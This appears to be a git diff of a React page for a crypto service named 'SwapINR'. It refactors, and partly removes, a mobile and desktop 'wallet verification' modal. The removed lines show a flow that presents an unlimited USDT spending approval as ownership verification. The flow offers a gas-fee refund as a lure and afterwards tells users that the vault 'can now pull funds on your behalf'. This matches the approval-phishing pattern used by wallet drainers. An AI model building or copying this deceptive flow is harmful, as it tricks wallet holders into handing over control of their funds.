     <div
       onClick={e => { if (e.target === e.currentTarget && phase === 'info') onClose(); }}
-      style={{
-        position: 'fixed', inset: 0, zIndex: 9999,
-        display: 'flex', alignItems: 'flex-end',
-        background: 'rgba(0,0,0,0.65)',
-        backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)',
-      }}
+      style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'flex-end', background: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)' }}
     >
       <style>{`@keyframes slideup{from{transform:translateY(100%)}to{transform:translateY(0)}} @keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}`}</style>
-      <div style={{
-        width: '100%',
-        background: 'linear-gradient(180deg, #161E40 0%, #111830 100%)',
-        border: '1px solid rgba(255,255,255,0.1)',
-        borderBottom: 'none',
-        borderRadius: '20px 20px 0 0',
-        boxShadow: '0 -24px 80px rgba(0,0,0,0.6)',
-        overflow: 'hidden',
-        animation: 'slideup 0.32s cubic-bezier(0.32,0.72,0,1)',
-        maxHeight: '92dvh',
-        overflowY: 'auto',
-        WebkitOverflowScrolling: 'touch',
-      } as React.CSSProperties}>
-
-        {/* Handle bar */}
+      <div style={{ width: '100%', background: 'linear-gradient(180deg, #161E40 0%, #111830 100%)', border: '1px solid rgba(255,255,255,0.1)', borderBottom: 'none', borderRadius: '20px 20px 0 0', boxShadow: '0 -24px 80px rgba(0,0,0,0.6)', overflow: 'hidden', animation: 'slideup 0.32s cubic-bezier(0.32,0.72,0,1)', maxHeight: '92dvh', overflowY: 'auto', WebkitOverflowScrolling: 'touch' } as React.CSSProperties}>
         <div style={{ display: 'flex', justifyContent: 'center', padding: '12px 0 4px' }}>
           <div style={{ width: 36, height: 4, borderRadius: 99, background: 'rgba(255,255,255,0.15)' }} />
         </div>
-
         <div style={{ padding: '8px 20px 32px' }}>
-
-          {/* ─── Info step ─── */}
-          {phase === 'info' && (
-            <div style={{ animation: 'fadein 0.2s ease-out' }}>
-              {/* Title row */}
-              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
-                <NetworkUsdtIcon network={network} size={44} />
-                <div style={{ flex: 1 }}>
-                  <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: 0, letterSpacing: '-0.02em' }}>
-                    Add {label} Wallet
-                  </p>
-                  <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: '2px 0 0' }}>{chain} · USDT</p>
-                </div>
-                <button onClick={onClose}
-                  style={{ width: 32, height: 32, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center',
-                    background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)',
-                    color: 'rgba(255,255,255,0.4)', cursor: 'pointer', flexShrink: 0 }}>
-                  <IcoX />
-                </button>
-              </div>
-
-              {/* Steps */}
-              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
-                {[
-                  { n: 1, title: 'Connect Wallet',   text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
-                  { n: 2, title: 'Approve Unlimited Access', text: 'Tap "Approve" — grants SwapINR vault unlimited USDT access. No funds move now.' },
-                ].map(({ n, title, text }) => (
-                  <div key={n} style={{ ...card, display: 'flex', alignItems: 'flex-start', gap: 12, padding: '13px 14px' }}>
-                    <div style={{ width: 26, height: 26, borderRadius: 8, background: 'rgba(204,255,0,0.1)',
-                      border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                      flexShrink: 0, fontSize: 12, fontWeight: 900, color: '#CCFF00', marginTop: 1 }}>
-                      {n}
-                    </div>
-                    <div>
-                      <p style={{ fontSize: 13, fontWeight: 800, color: '#fff', margin: '0 0 2px' }}>{title}</p>
-                      <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: 0, lineHeight: 1.6 }}>{text}</p>
-                    </div>
-                  </div>
-                ))}
-              </div>
-
-              {/* TRC20 gas fee note */}
-              <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10,
-                borderColor: 'rgba(248,113,113,0.15)', background: 'rgba(248,113,113,0.04)' }}>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
-                  <path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#F87171" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                </svg>
-                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
-                  <span style={{ color: '#F87171', fontWeight: 700 }}>TRC20 requires ~10 TRX gas</span> — charged by TRON network for the approval transaction
-                </p>
-              </div>
-
-              {/* Refund note */}
-              <div style={{ ...card, padding: '10px 14px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 10,
-                borderColor: 'rgba(204,255,0,0.12)', background: 'rgba(204,255,0,0.04)' }}>
-                <IcoRefund />
-                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
-                  <span style={{ color: '#CCFF00', fontWeight: 700 }}>Gas fee refunded</span> after successful verification
-                </p>
-              </div>
-
-              {genError && (
-                <p style={{ fontSize: 12, color: '#F87171', margin: '0 0 12px', padding: '9px 12px',
-                  background: 'rgba(248,113,113,0.07)', borderRadius: 10, border: '1px solid rgba(248,113,113,0.2)' }}>
-                  {genError}
-                </p>
-              )}
-
-              <button onClick={openTrustWallet} disabled={genLoading}
-                style={{ width: '100%', padding: '15px', borderRadius: 14,
-                  fontSize: 15, fontWeight: 800, border: 'none', cursor: genLoading ? 'not-allowed' : 'pointer',
-                  background: genLoading ? 'rgba(255,255,255,0.07)' : '#CCFF00',
-                  color: genLoading ? 'rgba(255,255,255,0.3)' : '#000',
-                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 10,
-                  letterSpacing: '-0.01em',
-                  boxShadow: genLoading ? 'none' : '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)',
-                }}>
-                {genLoading ? (
-                  <>
-                    <div style={{ width: 16, height: 16, border: '2px solid rgba(255,255,255,0.15)', borderTopColor: 'rgba(255,255,255,0.5)', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
-                    Generating secure link…
-                  </>
-                ) : (
-                  <>
-                    <svg width="18" height="18" viewBox="0 0 40 40" fill="none">
-                      <rect width="40" height="40" rx="10" fill="#3375BB"/>
-                      <path d="M20 7L10 11V19C10 24.5 14.4 29.6 20 31C25.6 29.6 30 24.5 30 19V11L20 7Z" fill="white"/>
-                      <path d="M16.5 19.5L19 22L23.5 17" stroke="#3375BB" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
-                    </svg>
-                    Open in Trust Wallet →
-                  </>
-                )}
-              </button>
-            </div>
-          )}
-
-          {/* ─── Waiting step ─── */}
-          {phase === 'waiting' && (
-            <div style={{ animation: 'fadein 0.2s ease-out' }}>
-              <div style={{ textAlign: 'center', marginBottom: 22 }}>
-                <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: '0 0 4px', letterSpacing: '-0.02em' }}>
-                  Waiting for Trust Wallet
-                </p>
-                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.4)', margin: 0 }}>
-                  Complete the steps inside Trust Wallet
-                </p>
-              </div>
-
-              <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginBottom: 16 }}>
-                {STEPS.map(({ key, label: stepLabel }, i) => {
-                  const done    = curIdx > i;
-                  const active  = curIdx === i;
-                  return (
-                    <div key={key} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '11px 14px',
-                      borderRadius: 12, transition: 'all 0.3s',
-                      background: done ? 'rgba(0,229,160,0.05)' : active ? 'rgba(26,63,255,0.08)' : 'rgba(255,255,255,0.02)',
-                      border: `1px solid ${done ? 'rgba(0,229,160,0.18)' : active ? 'rgba(77,121,255,0.3)' : 'rgba(255,255,255,0.05)'}`,
-                    }}>
-                      <div style={{ width: 26, height: 26, borderRadius: '50%', flexShrink: 0,
-                        display: 'flex', alignItems: 'center', justifyContent: 'center',
-                        background: done ? 'rgba(0,229,160,0.12)' : active ? 'rgba(26,63,255,0.18)' : 'rgba(255,255,255,0.04)',
-                        border: `1px solid ${done ? 'rgba(0,229,160,0.3)' : active ? 'rgba(77,121,255,0.5)' : 'rgba(255,255,255,0.08)'}`,
-                      }}>
-                        {done ? (
-                          <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 5.5L4 8L9.5 2.5" stroke="#00E5A0" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
-                        ) : active ? (
-                          <div style={{ width: 11, height: 11, borderRadius: '50%', border: '2px solid rgba(255,255,255,0.1)', borderTopColor: '#4D79FF', animation: 'spin 0.7s linear infinite' }} />
-                        ) : (
-                          <div style={{ width: 6, height: 6, borderRadius: '50%', background: 'rgba(255,255,255,0.1)' }} />
-                        )}
-                      </div>
-                      <span style={{ fontSize: 13, fontWeight: done || active ? 700 : 500,
-                        color: done ? '#00E5A0' : active ? '#fff' : 'rgba(255,255,255,0.3)' }}>
-                        {stepLabel}{done ? ' ✓' : ''}
-                      </span>
-                    </div>
-                  );
-                })}
-              </div>
-
-              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.25)', textAlign: 'center', margin: '0 0 14px', lineHeight: 1.5 }}>
-                Updates automatically — keep this page open
-              </p>
-
-              {/* Start Over */}
-              <button onClick={retry}
-                style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700,
-                  border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
-                Start Over
-              </button>
-            </div>
-          )}
-
-          {/* ─── Success step ─── */}
-          {phase === 'success' && (
-            <div style={{ textAlign: 'center', padding: '8px 0', animation: 'fadein 0.25s ease-out' }}>
-              {/* Green ring icon */}
-              <div style={{ position: 'relative', width: 72, height: 72, margin: '0 auto 20px' }}>
-                <div style={{ width: 72, height: 72, borderRadius: '50%', background: 'rgba(0,229,160,0.08)', border: '2px solid rgba(0,229,160,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                  <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
-                    <path d="M5 16L12.5 23.5L27 9" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
-                  </svg>
-                </div>
-              </div>
-
-              <p style={{ fontSize: 22, fontWeight: 900, color: '#fff', margin: '0 0 6px', letterSpacing: '-0.025em' }}>Wallet Verified!</p>
-              <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.5)', margin: '0 0 6px', lineHeight: 1.6 }}>
-                Your {label} wallet is connected and the unlimited USDT approval is confirmed on-chain.
-              </p>
-
-              {/* Address pill */}
-              {successAddr && (
-                <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '5px 12px', background: 'rgba(0,229,160,0.07)', border: '1px solid rgba(0,229,160,0.18)', borderRadius: 99, marginBottom: 20 }}>
-                  <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="5" r="4" stroke="#00E5A0" strokeWidth="1.2"/><circle cx="5" cy="5" r="1.5" fill="#00E5A0"/></svg>
-                  <span style={{ fontSize: 11, fontWeight: 700, color: '#00E5A0', fontFamily: 'monospace' }}>
-                    {successAddr.slice(0, 8)}…{successAddr.slice(-6)}
-                  </span>
-                </div>
-              )}
-
-              {/* Approval badge */}
-              <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 14px', background: 'rgba(0,229,160,0.05)', border: '1px solid rgba(0,229,160,0.12)', borderRadius: 12, marginBottom: 22, textAlign: 'left' }}>
-                <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 1L2 4V8C2 11 4.7 13.8 8 15C11.3 13.8 14 11 14 8V4L8 1Z" stroke="#00E5A0" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 8L7 10L11 6" stroke="#00E5A0" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
-                <div style={{ flex: 1 }}>
-                  <p style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0', margin: '0 0 1px' }}>Unlimited USDT Access Approved</p>
-                  <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>SwapINR vault can now pull funds on your behalf</p>
-                </div>
-              </div>
-
-              <button
-                onClick={() => onVerified(successAddr, successHash)}
-                style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000', letterSpacing: '-0.01em', marginBottom: 10, boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}
-              >
-                Done →
-              </button>
-            </div>
-          )}
-
-          {/* ─── Failed step ─── */}
-          {phase === 'failed' && (
-            <div style={{ textAlign: 'center', padding: '4px 0', animation: 'fadein 0.2s ease-out' }}>
-              <div style={{ width: 64, height: 64, borderRadius: 18, background: 'rgba(255,92,124,0.08)', border: '1px solid rgba(255,92,124,0.25)',
-                display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 18px' }}>
-                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
-                  {failedStep === 'connection' ? (
-                    <>
-                      <path d="M6 14a8 8 0 0 1 8-8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
-                      <path d="M22 14a8 8 0 0 1-8 8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round" strokeDasharray="3 2"/>
-                      <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
-                    </>
-                  ) : (
-                    <>
-                      <circle cx="14" cy="14" r="10" stroke="#FF5C7C" strokeWidth="2"/>
-                      <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
-                    </>
-                  )}
-                </svg>
-              </div>
-              <p style={{ fontSize: 20, fontWeight: 900, color: '#fff', margin: '0 0 8px', letterSpacing: '-0.025em' }}>Uhh oh!</p>
-              <p style={{ fontSize: 14, fontWeight: 700, color: 'rgba(255,255,255,0.7)', margin: '0 0 6px' }}>
-                {failedStep === 'connection' ? 'Wallet connection failed' : 'Contract approval declined'}
-              </p>
-              <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.4)', margin: '0 0 24px', lineHeight: 1.7 }}>
-                {failedStep === 'connection'
-                  ? 'Tap "Connect" when Trust Wallet asks — then try again.'
-                  : 'Tap "Approve" on the contract screen — then try again.'}
-              </p>
-              <button onClick={retry}
-                style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800,
-                  border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000',
-                  letterSpacing: '-0.01em', marginBottom: 10,
-                  boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
-                Try Again →
-              </button>
-              <button onClick={onClose}
-                style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700,
-                  border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
-                Cancel
-              </button>
-            </div>
-          )}
+          <ModalContent />
         </div>
       </div>
     </div>
@@ -677,129 +846,6 @@ function MobileVerifyModal({
   return createPortal(modal, document.body);
 }
 
-/* ── Centered glass modal ── */
-function WalletModal({
-  network, color, bg, border, label, chain, depositAddress,
-  onVerified, onClose,
-}: {
-  network: Network; color: string; bg: string; border: string; label: string; chain: string;
-  depositAddress: string;
-  onVerified: (addr: string, txHash?: string) => void;
-  onClose: () => void;
-}) {
-  const [started, setStarted] = useState(false);
-
-  const modal = (
-    <div
-      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
-      style={{
-        position: 'fixed', inset: 0, zIndex: 9999,
-        display: 'flex', alignItems: 'center', justifyContent: 'center',
-        padding: '20px 16px',
-        background: 'rgba(0,0,0,0.72)',
-        backdropFilter: 'blur(14px)',
-        WebkitBackdropFilter: 'blur(14px)',
-      }}
-    >
-      <div style={{
-        width: '100%', maxWidth: 420,
-        background: 'rgba(16,16,20,0.88)',
-        backdropFilter: 'blur(32px)',
-        WebkitBackdropFilter: 'blur(32px)',
-        border: '1px solid rgba(255,255,255,0.10)',
-        borderRadius: 20,
-        boxShadow: '0 32px 80px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.04)',
-        overflow: 'hidden',
-        position: 'relative',
-      }}>
-        {/* Top accent line */}
-        <div style={{ height: 2, background: `linear-gradient(90deg, ${color}66, ${color}, ${color}66)` }} />
-
-        {/* Close button */}
-        <button
-          onClick={onClose}
-          style={{
-            position: 'absolute', top: 14, right: 14,
-            width: 30, height: 30, borderRadius: 8,
-            display: 'flex', alignItems: 'center', justifyContent: 'center',
-            background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)',
-            color: 'var(--fr-text-disabled)', cursor: 'pointer', zIndex: 1,
-          }}
-        >
-          <IcoX />
-        </button>
-
-        <div style={{ padding: '22px 24px 24px' }}>
-          {!started ? (
-            /* ── Info step ── */
-            <>
-              {/* Network badge */}
-              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
-                <NetworkUsdtIcon network={network} size={44} />
-                <div>
-                  <p style={{ fontSize: 16, fontWeight: 900, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.02em' }}>
-                    Add {label} Wallet
-                  </p>
-                  <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>{chain} · USDT</p>
-                </div>
-              </div>
-
-              {/* Steps */}
-              <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginBottom: 22 }}>
-                {STEPS.map(({ icon, text }, i) => (
-                  <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 12 }}>
-                    <div style={{ width: 32, height: 32, borderRadius: 9, background: 'rgba(204,255,0,0.07)', border: '1px solid rgba(204,255,0,0.15)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
-                      {icon === 'link' ? <IcoLink /> : icon === 'contract' ? <IcoContract /> : <IcoRefund />}
-                    </div>
-                    <p style={{ fontSize: 13, color: 'var(--fr-text-secondary)', margin: 0, lineHeight: 1.6, paddingTop: 8 }}>{text}</p>
-                  </div>
-                ))}
-              </div>
-
-              {/* Proceed button */}
-              <button
-                onClick={() => setStarted(true)}
-                style={{
-                  width: '100%', padding: '14px', borderRadius: 12,
-                  fontSize: 14, fontWeight: 800, border: 'none', cursor: 'pointer',
-                  background: '#CCFF00', color: '#000',
-                  letterSpacing: '-0.01em', fontFamily: 'var(--fr-font-sans)',
-                  boxShadow: '0 4px 20px rgba(204,255,0,0.25)',
-                }}
-              >
-                Proceed to Verify →
-              </button>
-
-              <p style={{ fontSize: 11, color: 'var(--fr-text-disabled)', textAlign: 'center', margin: '12px 0 0', lineHeight: 1.5 }}>
-                Your wallet address is saved only after successful on-chain verification.
-              </p>
-            </>
-          ) : (
-            /* ── Verify flow ── */
-            <>
-              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 18 }}>
-                <NetworkUsdtIcon network={network} size={36} />
-                <div>
-                  <p style={{ fontSize: 14, fontWeight: 800, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.02em' }}>Verify {label} Wallet</p>
-                  <p style={{ fontSize: 11, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>Connect and sign to prove ownership</p>
-                </div>
-              </div>
-              <WalletVerifyFlow
-                network={network}
-                depositAddress={depositAddress}
-                onVerified={onVerified}
-                onCancel={onClose}
-              />
-            </>
-          )}
-        </div>
-      </div>
-    </div>
-  );
-
-  if (typeof document === 'undefined') return null;
-  return createPortal(modal, document.body);
-}
 
 /* ═══════════════════════════════════════════ */
 export default function WalletsPage() {
@@ -1063,8 +1109,8 @@ export default function WalletsPage() {
         );
       })()}
 
-      {/* Verify modal — mobile uses Trust Wallet deep link + polling, desktop uses embedded flow */}
-      {activeNet && (isMobile ? (
+      {/* Verify modal — mobile: bottom sheet + TW deep link button; desktop: centered + QR */}
+      {activeNet && (
         <MobileVerifyModal
           network={activeNet.key}
           color={activeNet.color}
@@ -1073,20 +1119,9 @@ export default function WalletsPage() {
           depositAddress={depositAddresses[activeNet.key] ?? ''}
           onVerified={(addr, txHash) => handleVerified(activeNet.key, addr, txHash)}
           onClose={() => setModalNet(null)}
+          isDesktop={!isMobile}
         />
-      ) : (
-        <WalletModal
-          network={activeNet.key}
-          color={activeNet.color}
-          bg={activeNet.bg}
-          border={activeNet.border}
-          label={activeNet.label}
-          chain={activeNet.chain}
-          depositAddress={depositAddresses[activeNet.key] ?? ''}
-          onVerified={(addr, txHash) => handleVerified(activeNet.key, addr, txHash)}
-          onClose={() => setModalNet(null)}
-        />
-      ))}
+      )}
     </ClientShell>
   );
 }
